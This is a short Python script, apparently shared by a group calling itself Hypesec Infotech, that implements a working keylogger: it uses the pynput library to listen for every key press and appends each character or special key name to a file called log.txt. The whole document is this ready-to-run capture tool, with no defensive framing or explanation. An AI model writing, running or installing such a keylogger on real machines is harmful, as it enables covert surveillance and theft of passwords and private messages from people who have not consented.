import pynput.keyboard

print("Script Has Been Writed By Hypesec Infotech")
def on_press(key):
    try:
        with open("log.txt", "a") as f:
            f.write(str(key.char))
    except AttributeError:
        with open("log.txt", "a") as f:
            f.write(" " + str(key) + " ")

def on_release(key):
    pass

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
